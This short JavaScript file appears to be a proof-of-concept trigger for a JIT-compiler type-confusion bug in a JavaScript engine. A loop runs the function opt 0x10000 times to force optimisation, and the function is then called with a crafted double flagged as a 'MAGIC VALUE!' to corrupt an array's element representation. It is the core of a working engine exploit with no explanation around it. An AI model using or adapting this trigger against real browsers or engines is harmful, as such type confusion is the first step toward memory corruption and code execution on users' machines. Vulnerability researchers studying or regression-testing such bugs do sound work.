function opt(arr, value) {
  arr[1] = value;
  arr[0] = 2.3023e-320;
}

function main() {
  for (let i = 0; i < 0x10000; i++) {
    opt([1.1], 2.2);
  }

  let arr = [1.1];
  opt(arr, -5.3049894784e-314); // MAGIC VALUE!

  print(arr);
}

main();
